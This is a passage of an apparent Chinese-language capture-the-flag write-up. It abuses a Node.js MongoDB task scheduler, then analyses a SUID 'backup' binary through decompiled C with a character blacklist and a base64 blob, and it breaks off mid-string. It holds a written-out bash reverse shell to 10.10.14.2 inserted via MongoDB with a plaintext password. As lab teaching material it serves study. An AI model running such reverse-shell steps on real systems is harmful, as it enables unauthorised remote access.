        docs.forEach(function (doc) {
          if (doc) {
            console.log(&#039;Executing task &#039; + doc._id + &#039;...&#039;);
            exec(doc.cmd);
            db.collection(&#039;tasks&#039;).deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log(&#039;Something went wrong: &#039; + error);
      }
    });
  }, 30000);

});</code></pre>
<p>发现程序每隔<code>30</code>秒会从<code>scheduler.tasks</code>集合内取出<code>_id</code>和<code>cmd</code>两个域的记录，随后使用<code>exec()</code>函数执行<code>cmd</code>的内容，随后使用<code>_id</code>中的内容删除<code>MongoDB</code>中相对应的记录。<br>
直接执行如下命令，向<code>MongoDB</code>添加后门计划任务，直接反弹Shell：</p>
<pre><code class="language-bash">mongo &quot;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler&quot;
db.tasks.insertOne({_id: ObjectId(), cmd: &quot;/bin/bash -c &#039;bash -i &gt;&amp; /dev/tcp/10.10.14.2/443 0&gt;&amp;1&#039;&quot;})</code></pre>
<p><img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719276747622-4478f357-7d46-46d0-8880-155d8853624b.png#averageHue=%231b1e2e&amp;clientId=u04eaebc9-3ef0-4&amp;from=ui&amp;id=u72f9e6d7&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=122930&amp;status=done&amp;style=none&amp;taskId=udd29024a-142c-4d45-b58a-9f87363c8d6&amp;title=" alt="插入恶意mongodb文档.png"><br>
<strong>反弹Shell成功！！</strong></p>
<h2>SUID程序提权</h2>
<p>进入<code>tom</code>用户后，使用<code>id</code>命令查看用户信息，发现当前用户在<code>admin</code>组中：<br>
<img decoding="async" src="https://cdn.nlark.com/yuque/0/2024/png/42816956/1719277840713-861600f3-145f-4f38-a990-9dbb46e52007.png#averageHue=%23262735&amp;clientId=u04eaebc9-3ef0-4&amp;from=ui&amp;id=ucdc59074&amp;originHeight=790&amp;originWidth=1440&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=482452&amp;status=done&amp;style=none&amp;taskId=u1deef6c7-9609-49ad-8e38-5d166ada8ba&amp;title=" alt="tom用户组.png"><br>
直接使用<code>/usr/local/bin/backup</code>进行提权。<br>
尝试对目标程序进行反汇编分析：</p>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  __uid_t v3; // eax
  __pid_t v4; // esi
  time_t v5; // ebx
  clock_t v6; // eax
  unsigned int v7; // eax
  char command[1500]; // [esp+1h] [ebp-10B1h] BYREF
  char name[1000]; // [esp+5DDh] [ebp-AD5h] BYREF
  char v11[500]; // [esp+9C5h] [ebp-6EDh] BYREF
  char s[1000]; // [esp+BB9h] [ebp-4F9h] BYREF
  char filename[100]; // [esp+FA1h] [ebp-111h] BYREF
  char v14[6]; // [esp+1005h] [ebp-ADh] BYREF
  char v15[3]; // [esp+100Bh] [ebp-A7h] BYREF
  _BYTE v16[6]; // [esp+100Eh] [ebp-A4h] BYREF
  char v17[6]; // [esp+1014h] [ebp-9Eh] BYREF
  char v18[6]; // [esp+101Ah] [ebp-98h] BYREF
  char src[2]; // [esp+1020h] [ebp-92h] BYREF
  char dest[100]; // [esp+1022h] [ebp-90h] BYREF
  int v21; // [esp+1086h] [ebp-2Ch]
  FILE *stream; // [esp+108Ah] [ebp-28h]
  int i; // [esp+108Eh] [ebp-24h]
  int v24; // [esp+1092h] [ebp-20h]
  int v25; // [esp+1096h] [ebp-1Ch]
  int *p_argc; // [esp+10A2h] [ebp-10h]

  p_argc = &amp;argc;
  v3 = geteuid();
  setuid(v3);
  v25 = 0;
  v24 = 0;
  if ( argc &lt;= 3 )
    exit(1);
  if ( strcmp(argv[1], &quot;-q&quot;) )
  {
    v24 = 1;
    puts(&quot;\n\n\n             ____________________________________________________&quot;);
    puts(&quot;            /                                                    \\&quot;);
    puts(&quot;           |    _____________________________________________     |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |             Secure Backup v1.0              |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |                                             |    |&quot;);
    puts(&quot;           |   |_____________________________________________|    |&quot;);
    puts(&quot;           |                                                      |&quot;);
    puts(&quot;            \\_____________________________________________________/&quot;);
    puts(&quot;                   \\_______________________________________/&quot;);
    puts(&quot;                _______________________________________________&quot;);
    puts(&quot;             _-&#039;    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_&quot;);
    puts(&quot;          _-&#039;.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_&quot;);
    puts(&quot;       _-&#039;.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_&quot;);
    puts(&quot;    _-&#039;.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_&quot;);
    puts(&quot; _-&#039;.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_&quot;);
    puts(&quot;:-----------------------------------------------------------------------------:&quot;);
    puts(&quot;`---._.-----------------------------------------------------------------._.---&#039;\n\n&quot;);
  }
  strncpy(dest, argv[2], 0x64u);
  strcpy(src, &quot;/&quot;);
  strcpy(v14, &quot;/e&quot;);
  strcpy(&amp;v14[3], &quot;tc&quot;);
  strcpy(v15, src);
  *(_WORD *)&amp;v15[strlen(v15)] = 109;
  strcpy(v16, &quot;yp&quot;);
  strcpy(&amp;v16[3], &quot;la&quot;);
  strcpy(v17, &quot;ce&quot;);
  strcpy(&amp;v17[3], src);
  *(_WORD *)&amp;v17[strlen(&amp;v17[3]) + 3] = 107;
  strcpy(v18, &quot;ey&quot;);
  strcpy(&amp;v18[3], &quot;s&quot;);
  strcpy(filename, v14);
  for ( i = 1; i &lt;= 8; ++i )
    strcat(filename, &amp;v14[3 * i]);
  stream = fopen(filename, &quot;r&quot;);
  if ( !stream )
  {
    if ( v24 == 1 )
      displayWarning(&quot;Could not open file\n\n&quot;);
    exit(1);
  }
  while ( fgets(s, 1000, stream) )
  {
    s[strcspn(s, &quot;\n&quot;)] = 0;
    if ( !strcmp(dest, s) )
    {
      v25 = 1;
      if ( v24 == 1 )
        displaySuccess(&quot;Validated access token&quot;);
    }
  }
  if ( v25 != 1 )
  {
    if ( v24 == 1 )
      displayWarning(&quot;Ah-ah-ah! You didn&#039;t say the magic word!\n\n&quot;);
    exit(1);
  }
  if ( strstr(argv[3], &quot;..&quot;) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strstr(argv[3], &quot;/root&quot;) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strchr(argv[3], 59) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strchr(argv[3], 38) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strchr(argv[3], 96) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strchr(argv[3], 36) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
      &quot;aFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnict&quot;
      &quot;zNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBw&quot;
      &quot;ACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==&quot;);
    exit(0);
  }
  if ( strchr(argv[3], 124) )
  {
    displaySuccess(&quot;Finished! Encoded backup is below:\n&quot;);
    puts(
      &quot;UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpS&quot;
      &quot;vYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZor&quot;
      &quot;Y67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207Ef&quot;
      &quot;D3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2&quot;
      &quot;EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/&quot;
      &quot;a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MM&quot;
      &quot;yU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut2&quot;
      &quot;2WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd2&quot;
      &quot;6PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJr&quot;
      &quot;yLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOx&quot;
      &quot;kDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmP&quot;
